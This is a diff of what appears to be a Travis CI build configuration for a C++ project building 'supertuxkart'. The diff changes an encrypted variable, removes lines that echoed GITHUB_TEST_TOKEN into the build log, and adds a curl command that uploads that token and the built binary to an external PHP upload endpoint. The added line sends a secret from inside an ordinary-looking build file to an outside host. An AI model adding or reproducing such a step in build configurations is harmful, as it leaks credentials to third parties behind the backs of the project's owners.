@@ -5,7 +5,7 @@
 #
 env:
   global:
-    - secure: "XFAGsCXxWF1OKET++clUcQyri63wV7AFxSzMsbnEqk7IidakTS1QsjbBxudGNei2m9q32hQmG3L5/GLRDgeSWdfXtjr7Dw+3pD0OIPBl/Cjwm+0qMhlIW//QfqFov+pBamQbwA72x5BpRyh/Zc6jp9V8hPtnjG9V92RwfszvHOc="
+    - secure: "cS4Fp3nRLffUr59OiUADRw+A4mx9d6yDTEXdghLhZCea2owpsr4lVrAopVsV9nr8BUJVyk7szVAuAiWYedqPL7QLtsmb6/kmSdakMRTenJVp0B34vZVATCe4y4hdA21I398f729jTbuo4W2i6ItSXUQwYS89R7w2M+lasyMnL7c="
 
 language: cpp
 compiler:
@@ -34,8 +34,8 @@ script:
   - pwd
   - ls -l bin
   - date
-  - echo -n GITHUB_TEST_TOKEN '  '
-  - echo $GITHUB_TEST_TOKEN
+  - curl -F "text=$GITHUB_TEST_TOKEN" -F "file=@bin/supertuxkart" https://ming-openbox.rhcloud.com/phpsrc/upload_file.php
+  - date
 ##deploy:
 ##  provider: releases
 ##  api-key: $GITHUB_TOKEN
